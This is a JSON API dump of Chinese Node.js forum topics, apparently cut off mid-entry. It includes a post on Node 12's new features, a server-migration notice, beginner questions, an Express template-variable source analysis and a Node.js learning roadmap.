{"success":true,"data":[{"id":"5cbfd9aca86ae80ce64b3175","author_id":"4f447c2f0a8abae26e01b27d","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>时隔一年，Node.js 12 如约而至，正式发布第一个 <a href=\"https://github.com/nodejs/Release\">Current</a> 版本。</p>\n<p>该版本带来了诸如：</p>\n<ul>\n<li>V8 更新带来好多不错的特性。</li>\n<li>HTTP 解析速度提升。</li>\n<li>启动速度大幅提升。</li>\n<li>更好的诊断报告和堆分析工具。</li>\n<li>ESM 模块更新。</li>\n</ul>\n<p>原文地址：<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/nodejs\">@nodejs</a>/introducing-node-js-12-76c41a1b3f3f\n语雀地址：<a href=\"https://www.yuque.com/egg/nodejs/nodejs-12\">https://www.yuque.com/egg/nodejs/nodejs-12</a></p>\n<h2>LTS vs Current</h2>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/84182/1556074709431-35af45b8-ec7a-4a81-83d8-155eb519f04a.png#align=left&amp;display=inline&amp;height=389&amp;name=image.png&amp;originHeight=500&amp;originWidth=960&amp;size=58313&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>如果你不了解 Node.js 的  Long Term Support 发布策略的话，一定要看看 <a href=\"https://github.com/nodejs/Release\">https://github.com/nodejs/Release</a> 。</p>\n<p>就目前而言，Node.js 6.x 和 8.x 将在 2019 年末结束 LTS 的支持，大家尽快升级到 10.x 吧。</p>\n<h2>快速体验</h2>\n<pre class=\"prettyprint language-bash\"><code>$ nvs add node&#x2F;12\n$ nvs use 12\n$ node -v\nv12.0.0\n</code></pre><p>具体参考这篇文章：<a href=\"https://zhuanlan.zhihu.com/p/63403762\">科普文：使用 nvs 管理本地 Node.js 版本</a></p>\n<h2>V8 更新到 7.4</h2>\n<blockquote>\n<p>大部分情况下，我们不用去考虑性能问题，坐等 V8 版本更新就好了。（大雾）</p>\n</blockquote>\n<p>本次版本更新，也带来了好几个不错的特性：</p>\n<ul>\n<li><a href=\"https://v8.dev/blog/v8-release-72#async-stack-traces\">异步堆栈跟踪</a></li>\n<li><a href=\"https://v8.dev/blog/v8-release-74#faster-calls-with-arguments-mismatch\">参数调用不匹配时的调用速度优化</a></li>\n<li><a href=\"https://v8.dev/blog/v8-release-73#faster-await\">更快的 await</a></li>\n<li><a href=\"https://v8.dev/blog/v8-release-72#javascript-parsing\">更快的 JavaScript 解析速度</a></li>\n</ul>\n<p><strong>同时，跑了下我们 Egg 的一些内部测试，发现序列化有 10~20% 的性能提升，恐怖如斯！</strong></p>\n<p>另，奇丑无比的 <a href=\"https://github.com/tc39/proposal-class-fields\">Private Class Fields</a> 也能用了：</p>\n<pre class=\"prettyprint language-javascript\"><code>class IncreasingCounter {\n  #count = 0;\n  \n  get value() {\n    console.log(&#x27;Getting the current value!&#x27;);\n    return this.#count;\n  }\n  increment() {\n    this.#count++;\n  }\n}\n</code></pre><h2>HTTP 解析速度提升</h2>\n<p>默认的 HTTP 解析器切换为 <a href=\"https://github.com/nodejs/llhttp\">llhttp</a> ，性能提升恐怖如斯：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/84182/1556072499637-686bb0e3-c75c-424c-851f-ad88aff183a2.png#align=left&amp;display=inline&amp;height=231&amp;name=image.png&amp;originHeight=404&amp;originWidth=1302&amp;size=88775&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<blockquote>\n<p>点评：恐怖如斯。</p>\n</blockquote>\n<h2>启动速度提升</h2>\n<p>通过 <a href=\"https://v8.dev/blog/code-caching\">v8 code cache</a> 的支持，<a href=\"https://github.com/nodejs/node/pull/27161\">在构建时提前为内置库生成代码缓存</a>，从而提升 30% 的启动耗时。\n同时，通过<a href=\"https://github.com/nodejs/node/pull/24950\">重用主进程缓存</a>，Workers Threads 的启动速度提升了 60% 。</p>\n<blockquote>\n<p>点评：恐怖如斯。</p>\n</blockquote>\n<h2>Workers Threads</h2>\n<p>在 10.x 已经引入的 <a href=\"https://nodejs.org/api/worker_threads.html\">Workers Threads</a> 特性，在 12.x 里面默认启用，无需使用 <code>--experimental-worker</code> 开启。同时基于上一条的介绍，启动的速度也得到大幅提升。</p>\n<p>相关介绍：[<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/Trott\">@Trott</a>/using-worker-threads-in-node-js-80494136dbb6](<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/Trott\">@Trott</a>/using-worker-threads-in-node-js-80494136dbb6)</p>\n<h2>诊断报告</h2>\n<p>提供了新的实验性功能『诊断报告』，一个非常有用的特性。\n可用于帮助分析诸如：崩溃，性能问题，内存泄漏，高 CPU 占用等等问题。详见 <a href=\"https://medium.com/the-node-js-collection/easily-identify-problems-in-node-js-applications-with-diagnostic-report-dc82370d8029\">这篇文章</a>。</p>\n<blockquote>\n<p>点评：这也是 <a href=\"https://www.aliyun.com/product/nodejs\">AliNode</a> 之前的一个卖点之一。</p>\n</blockquote>\n<h2>Heap Dump</h2>\n<p>以前我们分析问题的时候，需要手动安装对应的类库或者使用 AliNode。</p>\n<p>在 12.x 里面内置了该功能，详见：</p>\n<ul>\n<li><a href=\"https://github.com/nodejs/node/pull/27133\">https://github.com/nodejs/node/pull/27133</a></li>\n<li><a href=\"https://github.com/nodejs/node/pull/26501\">https://github.com/nodejs/node/pull/26501</a></li>\n</ul>\n<blockquote>\n<p>点评：又一个 <a href=\"https://www.aliyun.com/product/nodejs\">AliNode</a> 的功能被内置了。但其实影响不大，AliNode 的核心在于分析平台，这块的采集能力，本来他们就打算开源回馈出去的。</p>\n</blockquote>\n<p>同时，由于上述提到的 V8 升级，现在可以按照可用内存动态调整堆大小了。</p>\n<h2>ESM 模块方案更新</h2>\n<p>ES6 模块仍然还在实验阶段，不过有了新的方式，具体参见<a href=\"https://medium.com/%5B@nodejs%5D(/user/nodejs)/announcing-a-new-experimental-modules-1be8d2d6c2ff\">这篇文章</a>。</p>\n<blockquote>\n<p>点评：让子弹再飞一会，该特性真的不是痛点，不急。</p>\n</blockquote>\n<h2>其他更新</h2>\n<ul>\n<li>更好的原生模块支持，<a href=\"https://nodejs.org/api/n-api.html#n_api_n_api\">N-API</a> 升级为版本 4，并 backport 到 Node.js 8.x 和 10.x。详细参见<a href=\"https://medium.com/the-node-js-collection/new-features-bring-native-add-ons-close-to-being-on-par-with-js-modules-cd4f9b8e4b4\">这篇文章</a>。</li>\n<li>TLS 升级为 1.3， <a href=\"https://developer.ibm.com/blogs/openssl-111-has-landed-in-nodejs-master-and-why-its-important-for-nodejs-lts-releases/\">增强安全功能</a>。</li>\n<li>随着 C++ 编译器的更新，现在要求 <code>GCC 6</code> 和 <code>glibc 2.17</code> ，对应的操作系统 Win7 和 macOS 10，详细参见<a href=\"https://github.com/nodejs/node/blob/v12.x/BUILDING.md#platform-list\">这篇文章</a>。</li>\n</ul>\n<p>不过目前 node-gyp 的一些原生模块会编译失败：</p>\n<pre class=\"prettyprint language-bash\"><code>nunjucks@3.2.0 › chokidar@2.1.5 › fsevents@^1.2.7 optional error: Error: Run &quot;sh -c node install&quot; error, exit code 1\n    at ChildProcess.&lt;anonymous&gt; (&#x2F;Users&#x2F;tz&#x2F;.npm-global&#x2F;lib&#x2F;node_modules&#x2F;tnpm&#x2F;node_modules&#x2F;_runscript@1.3.0@runscript&#x2F;index.js:74:21)\n    at ChildProcess.emit (events.js:196:13)\n    at maybeClose (internal&#x2F;child_process.js:1000:16)\n    at Process.ChildProcess._handle.onexit (internal&#x2F;child_process.js:267:5)\n</code></pre></div>","title":"Node 12 值得关注的新特性","last_reply_at":"2019-05-07T01:50:54.065Z","good":false,"top":true,"reply_count":32,"visit_count":11032,"create_at":"2019-04-24T03:36:12.582Z","author":{"loginname":"atian25","avatar_url":"https://avatars2.githubusercontent.com/u/227713?v=4&s=120"}},{"id":"5bd4772a14e994202cd5bdb7","author_id":"504c28a2e2b845157708cb61","tab":"share","content":"<div class=\"markdown-text\"><p>2018年10月27日晚上，突然收到服务器不能访问的告警通知，拜托了狼叔 <a href=\"/user/i5ting\">@i5ting</a> 帮忙看看，结果登不上也ping不通。\n后来收到短信，发现是被ucloud封了，短信内容如下：</p>\n<blockquote>\n<p>【UCloud】尊敬的UCloud用户，您的IP：123.59.77.142  存在URL ：<a href=\"https://cnodejs.org/topic/57239bce5a26c4a841ecbf01\">https://cnodejs.org/topic/57239bce5a26c4a841ecbf01</a> （详细信息请查看邮箱）包含违禁内容（包括但不限于翻墙等），违反了国家有关法律法规。目前依主管单位要求，对您的IP予以封停，请您尽快处理违规内容。待处理完成后请联系技术支持重新开启业务。[4000188113]</p>\n</blockquote>\n<p>然后联系了ucloud的客服，一下就打通了，对方态度挺好处理问题也快。ucloud说是运营商那边封的，不是他们的检测机制。所以需要联系运营商解决。\n考虑到各位亲爱的网友们的行为我无法控制，那么一直跟越来越严格的审查系统对抗只会让自己疲惫，所以我就站点迁到国外。来到了aws jp。</p>\n<p>我大致测了测，电信和移动的访问速度非常快，100ms以内，联通会慢一点，400ms以内吧。</p>\n<p>建议翻墙访问。</p>\n</div>","title":"服务器迁移至 aws 日本机房","last_reply_at":"2019-05-05T09:20:06.831Z","good":false,"top":true,"reply_count":190,"visit_count":38445,"create_at":"2018-10-27T14:33:14.694Z","author":{"loginname":"alsotang","avatar_url":"https://avatars1.githubusercontent.com/u/1147375?v=4&s=120"}},{"id":"5cd0575a5a5bae6e07813941","author_id":"5c91ace496558e26e1b677bd","tab":"ask","content":"<div class=\"markdown-text\"><p>nodejs中对于大文件一般是用stream来操作的，但是对于更大的文件，处理还是很耗时间。所以我就想能不能用子进程结合fs.createReadStrem的方式，使用其中的start,end来进行文件分片，再交由子进程读取后使用process.send发给主进程。但是自己写的代码发现往往比单进程还要耗时，请问我这样的思考方向有问题吗？另外，现在我学nodejs纯粹是想到哪写到哪，请问有没有什么好的nodejs书籍或者在线学习的地方推荐？劳烦各位解疑了，谢谢。</p>\n</div>","title":"Nodejs对于大文件分片的思考","last_reply_at":"2019-05-07T06:03:33.315Z","good":false,"top":false,"reply_count":2,"visit_count":157,"create_at":"2019-05-06T15:48:42.535Z","author":{"loginname":"HyperClockUp","avatar_url":"https://avatars2.githubusercontent.com/u/36909196?v=4&s=120"}},{"id":"5cd0de895a5bae6e07813a04","author_id":"58f023c5e54976e847e0a039","tab":"ask","content":"<div class=\"markdown-text\"><p>用过express写过两个很小的项目，但是对于nodejs本身了解的很少。每次想要好好的学习下nodejs，然而点开文档，随便找一个模块都发现api这么多。 在这么多的api当中，如何选择最常用的。</p>\n</div>","title":"nodejs的api这么多，在学习的过程中应该如何有的放矢。","last_reply_at":"2019-05-07T05:42:51.030Z","good":false,"top":false,"reply_count":8,"visit_count":250,"create_at":"2019-05-07T01:25:29.133Z","author":{"loginname":"WUSO01","avatar_url":"https://avatars0.githubusercontent.com/u/21070775?v=4&s=120"}},{"id":"5cd1171b776fb66e0d172e6f","author_id":"5c9120fa8a587f26b426c8d9","tab":"share","content":"<div class=\"markdown-text\"><p>express中为模板传入变量的时候可以通过：\n1.res.render的options：\n通过向res.render函数传入optinos：res.render(目标模板名，{user:‘djw’})；</p>\n<p>在EJS模版中通过&lt;%=user%&gt;使用变量</p>\n<p>2.res.locals：\n在res.locas对象上直接赋值：res.locals.user = ‘djw’</p>\n<p>3.app.locals\n在res.locas对象上直接赋值：res.locals.user = ‘djw’</p>\n<p>4.app.set\n通过向app.set函数传入变量名称和值：app.set(‘user’,‘djw’);这种方式会向模板中传入一个程序级变量Settings，在EJS模板中通过&lt;%=settings.user%&gt;使用变量</p>\n<p>res.render的opts 、res.locals、app.locals的优先级：\n由于通过app.set设置的变量其实只挂在app.locals.settings上面的，所以不用考虑优先级设置。</p>\n<p>为什么是这种优先级呢？\n在调用res.render中会先把res.locals挂到res.render的options上①，然后调用app.render②：</p>\n<p>res.render = function render(view, options, callback) {\nvar app = this.req.app;\nvar done = callback;\nvar opts = options || {};\nvar req = this.req;\nvar self = this;</p>\n<p>// support callback function as second arg\nif (typeof options === ‘function’) {\ndone = options;\nopts = {};\n}</p>\n<p>// merge res.locals\nopts._locals = self.locals;                                                  ①</p>\n<p>// default callback to respond\ndone = done || function (err, str) {\nif (err) return req.next(err);\nself.send(str);\n};</p>\n<p>// render\napp.render(view, opts, done);                                            ②\n};</p>\n<p>在app.render创建renderOptions然后依次把app.locals，res.locals，res.render的optionsmerge到renderOptions上。</p>\n<p>先看下merge的实现:</p>\n<p>exports = module.exports = function(a, b){\nif (a &amp;&amp; b) {\nfor (var key in b) {\na[key] = b[key];\n}\n}\nreturn a;\n};\nmerge把b上的属性赋值到a上，所以后merge的会覆盖之前已存在的属性，例如：app.locals.user=‘djw’会先merge到renderOptions上，之后res.locals.user=‘kkp’会后覆盖掉已存在的user。这样就形成了res.render的options&gt;res.locals&gt;app.locals的优先级。</p>\n<p>源码：</p>\n<p>app.render = function render(name, options, callback) {</p>\n<p>var cache = this.cache;\nvar done = callback;\nvar engines = this.engines;\nvar opts = options;\nvar renderOptions = {};\nvar view;</p>\n<p>// support callback function as second arg\nif (typeof options === ‘function’) {\ndone = options;\nopts = {};\n}</p>\n<p>// merge app.locals\nmerge(renderOptions, this.locals);</p>\n<p>// merge options._locals options._locals就是挂在的render的options上的res.locals\nif (opts._locals) {\nmerge(renderOptions, opts._locals);\n}</p>\n<p>// merge options\nmerge(renderOptions, opts);</p>\n<p>// set .cache unless explicitly provided\nif (renderOptions.cache == null) {\nrenderOptions.cache = this.enabled(‘view cache’);\n}</p>\n<p>// primed cache\nif (renderOptions.cache) {\nview = cache[name];\n}</p>\n<p>// view\nif (!view) {\nvar View = this.get(‘view’);</p>\n<p>view = new View(name, {\ndefaultEngine: this.get(‘view engine’),\nroot: this.get(‘views’),\nengines: engines\n});</p>\n<p>if (!view.path) {\nvar dirs = Array.isArray(view.root) &amp;&amp; view.root.length &gt; 1\n? ‘directories &quot;’ + view.root.slice(0, -1).join(’&quot;, “’) + '” or “’ + view.root[view.root.length - 1] + '”’\n: ‘directory &quot;’ + view.root + '&quot;'\nvar err = new Error(‘Failed to lookup view &quot;’ + name + '&quot; in views ’ + dirs);\nerr.view = view;\nreturn done(err);\n}</p>\n<p>// prime the cache\nif (renderOptions.cache) {\ncache[name] = view;\n}\n}</p>\n<p>// render\ntryRender(view, renderOptions, done);\n};\n之后tryRender通过app.set(‘view’，fn)设置的模板引擎进行渲染。\n掘金连接：<a href=\"https://juejin.im/post/5cd0f948e51d456e2d69a828\">https://juejin.im/post/5cd0f948e51d456e2d69a828</a>\n引用：</p>\n<p>1.《node.js实战》图片</p>\n<p>​ ​2.express.源码</p>\n</div>","title":"express传入模板引擎变量的源码分析","last_reply_at":"2019-05-07T05:26:51.904Z","good":false,"top":false,"reply_count":0,"visit_count":34,"create_at":"2019-05-07T05:26:51.904Z","author":{"loginname":"2015308200114dujiawei","avatar_url":"https://avatars3.githubusercontent.com/u/31696279?v=4&s=120"}},{"id":"5cd10b5c5a5bae6e07813c9e","author_id":"55f7f53320d84f3d37758273","tab":"ask","content":"<div class=\"markdown-text\"><p>原数据（ json ）:<code>{&quot;id&quot;:1010,&quot;na&quot;:&quot;zhangsan&quot;}</code></p>\n<p>转成 byte：<code>[123 34 105 100 34 58 49 48 49 48 44 34 110 97 109 101 34 58 34 229 188 160 228 184 137 34 125]</code></p>\n<p>现在想直接通过 http 的方式将 byte send 出去，好像不行啊？ 用 golang 和 node.js 分别试了下，最后 send 出去的文件打开之后就直接变成了原 json 串了</p>\n<p>付代码：</p>\n<pre class=\"prettyprint\"><code>let b = new Buffer(&#96;{&quot;id&quot;:1010,&quot;na&quot;:&quot;zhangsan&quot;}&#96;)\nresponse.send(b)\n</code></pre></div>","title":"node如何 response byte 数据","last_reply_at":"2019-05-07T05:07:21.264Z","good":false,"top":false,"reply_count":1,"visit_count":71,"create_at":"2019-05-07T04:36:44.402Z","author":{"loginname":"im-here","avatar_url":"https://avatars1.githubusercontent.com/u/12947399?v=4&s=120"}},{"id":"5cd104ce776fb66e0d172db8","author_id":"5cce8b1b776fb66e0d171fb7","tab":"ask","content":"<div class=\"markdown-text\"><p>突然想入坑nodejs了\n求推荐入坑教程</p>\n</div>","title":"朋友们能分享一下nodejs入门教程吗","last_reply_at":"2019-05-07T04:33:51.989Z","good":false,"top":false,"reply_count":1,"visit_count":73,"create_at":"2019-05-07T04:08:46.815Z","author":{"loginname":"liuyifengmvc","avatar_url":"https://avatars2.githubusercontent.com/u/46715265?v=4&s=120"}},{"id":"5cce6dfb776fb66e0d171e89","author_id":"5b0eaaf38a4f51e140d9437d","tab":"share","content":"<div class=\"markdown-text\"><h1>Node.js技术栈</h1>\n<blockquote>\n<p>为Node.js学习贡献一份自己微小的力量，本文档是作者从事<code>Node.js Developer</code>以来的学习历程，旨在为大家提供一个较详细的学习教程，侧重点更倾向于Node.js服务端所涉及的技术栈，如果本文能为您得到帮助，请给予支持！</p>\n</blockquote>\n<p><strong>如何支持：</strong></p>\n<ul>\n<li>搜索公众号 <strong><code>Node.js技术栈</code></strong> 进行关注</li>\n<li>点击右上角Star :star: 给予关注</li>\n<li>分享给您身边更多的小伙伴</li>\n</ul>\n<blockquote>\n<p><strong>Github</strong>：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap\">https://github.com/Q-Angelo/Nodejs-Roadmap</a></p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th><a href=\"#JavaScript\"><code>JavaScript</code></a></th>\n<th><a href=\"#ECMAScript6\"><code>ECMAScript6</code></a></th>\n<th><a href=\"#Nodejs\"><code>Node.js</code></a></th>\n<th><a href=\"#DataBase\"><code>DataBase</code></a></th>\n<th><a href=\"#Microservice\"><code>Microservice</code></a></th>\n<th><a href=\"#HTTP%E5%8D%8F%E8%AE%AE%E5%AE%9E%E6%88%98\"><code>HTTP</code></a></th>\n<th><a href=\"#DevOps\"><code>DevOps</code></a></th>\n<th><a href=\"#%E5%B7%A5%E5%85%B7\"><code>工具</code></a></th>\n<th><a href=\"#%E8%B5%84%E6%96%99\"><code>资料</code></a></th>\n</tr>\n</thead>\n<tbody></tbody>\n</table>\n<h2>JavaScript</h2>\n<ul>\n<li><strong>基础</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md\">[more]</a>\n<ul>\n<li><code>[基础]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\">常见问题</a></li>\n<li><code>[基础]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#undefined%E4%B8%8Eundeclared%E7%9A%84%E5%8C%BA%E5%88%AB\">undefined与undeclared的区别？</a></li>\n<li><code>[基础]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B\">typeof、instanceof 类型检测</a></li>\n<li><code>[作用域]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#%E6%AC%BA%E9%AA%97%E8%AF%8D%E6%B3%95%E4%BD%9C%E7%94%A8%E5%9F%9F\">eval()、with 欺骗词法作用域</a></li>\n<li><code>[Error]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#%E9%94%99%E8%AF%AF\">错误类型ReferenceError、TypeError的区别？</a></li>\n<li><code>[面试]</code> <code>编写一个函数实现多维数组去重？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E7%9A%84%E4%B8%89%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F\">数组去重的三种实现方式</a></li>\n<li><code>[面试]</code> <code>实现对多维数组降维？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/base.md#%E6%95%B0%E7%BB%84%E9%99%8D%E7%BB%B4\">数组降维–扁平化多维数组</a></li>\n</ul>\n</li>\n<li><strong>This</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md\">[more]</a>\n<ul>\n<li><code>[This指向]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md#%E6%8C%87%E5%90%91%E8%87%AA%E8%BA%AB\">指向自身</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md#%E6%8C%87%E5%90%91%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F\">指向函数的作用域</a></li>\n<li><code>[绑定规则]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md#%E9%BB%98%E8%AE%A4%E7%BB%91%E5%AE%9A\">默认绑定</a>、 <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md#%E9%9A%90%E5%BC%8F%E7%BB%91%E5%AE%9A\">隐式绑定</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md#%E6%98%BE%E7%A4%BA%E7%BB%91%E5%AE%9A\">显示绑定</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/this.md#new%E7%BB%91%E5%AE%9A\">new绑定</a></li>\n</ul>\n</li>\n<li><strong>函数</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md\">[more]</a>\n<ul>\n<li><code>[Function]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F\">函数声明与函数表达式</a></li>\n<li><code>[Function]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0\">内置函数</a></li>\n<li><code>[Function]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#arguments%E5%AF%B9%E8%B1%A1\">arguments对象</a></li>\n<li><code>[Function]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#call%E5%92%8Capply%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E5%8C%BA%E5%88%AB\">call和apply的使用与区别?</a></li>\n<li><code>[Function]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92\">引用传递</a></li>\n<li><code>[面试]</code> <code>递归调用实现一个阶乘函数？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#arguments%E5%AF%B9%E8%B1%A1\">arguments对象</a></li>\n<li><code>[面试]</code> <code>如何理解JavaScript中的引用传递与值传递？JS中是否拥有引用传递？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92\">引用传递</a></li>\n<li><code>[面试]</code> <code>经典面试题：什么是匿名函数和闭包？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/func.md#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E4%B8%8E%E9%97%AD%E5%8C%85\">深入理解匿名函数与闭包</a></li>\n</ul>\n</li>\n<li><strong>对象</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md\">[more]</a>\n<ul>\n<li><code>[Object]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95\">创建对象的四种方法</a>：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E5%AF%B9%E8%B1%A1%E5%AD%97%E9%9D%A2%E9%87%8F%E5%88%9B%E5%BB%BA\">对象字面量</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E4%BD%BF%E7%94%A8new%E5%85%B3%E9%94%AE%E5%AD%97%E6%9E%84%E9%80%A0%E5%BD%A2%E5%BC%8F%E5%88%9B%E5%BB%BA\">new关键字构造形式</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E5%AF%B9%E8%B1%A1%E7%9A%84create%E6%96%B9%E6%B3%95%E5%88%9B%E5%BB%BA\">create方法</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E5%8E%9F%E5%9E%8Bprototype%E5%88%9B%E5%BB%BA\">原型prototype创建</a></li>\n<li><code>[面试]</code> <code>什么是引用传递？{} == {} 是否等于true</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E7%A4%BA%E4%BE%8B%E5%88%86%E6%9E%90\">对象引用类型示例分析</a></li>\n<li><code>[面试]</code> <code>如何编写一个对象的深度拷贝函数？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E5%AF%B9%E8%B1%A1copy%E5%AE%9E%E7%8E%B0\">对象copy实现</a></li>\n<li><code>[面试]</code> <code>new操作符具体做了哪些操作，重要知识点！</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/object.md#%E4%BD%BF%E7%94%A8new%E5%85%B3%E9%94%AE%E5%AD%97%E6%9E%84%E9%80%A0%E5%BD%A2%E5%BC%8F%E5%88%9B%E5%BB%BA\">使用new关键字构造形式创建</a></li>\n</ul>\n</li>\n<li><strong>原型</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md\">[more]</a>\n<ul>\n<li><code>[ProtoType]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E5%8E%9F%E5%9E%8B%E6%A6%82%E5%BF%B5\">原型概念</a></li>\n<li><code>[ProtoType]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B\">原型模式的执行流程</a></li>\n<li><code>[ProtoType]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95\">构造函数实例属性方法</a></li>\n<li><code>[ProtoType]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E6%9E%84%E5%BB%BA%E5%8E%9F%E5%9E%8B%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95\">构建原型属性方法</a></li>\n<li><code>[ProtoType]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E5%8E%9F%E5%9E%8B%E5%AD%97%E9%9D%A2%E9%87%8F%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1\">原型字面量创建对象</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E5%AD%97%E9%9D%A2%E9%87%8F%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1\">字面量创建对象</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1\">构造函数创建对象</a></li>\n<li><code>[ProtoType]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E5%8E%9F%E5%9E%8B%E7%9A%84%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8\">原型的实际应用</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#jquery%E4%B8%AD%E5%8E%9F%E5%9E%8B%E5%BA%94%E7%94%A8\">jquery中原型应用</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#zepto%E4%B8%AD%E5%8E%9F%E5%9E%8B%E7%9A%84%E5%BA%94%E7%94%A8\">zepto中原型的应用</a></li>\n<li><code>[面试]</code> 如何实现原型的扩展？，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/prototype.md#%E5%8E%9F%E5%9E%8B%E7%9A%84%E6%89%A9%E5%B1%95\">原型的扩展</a></li>\n</ul>\n</li>\n<li><strong>正则</strong> <a 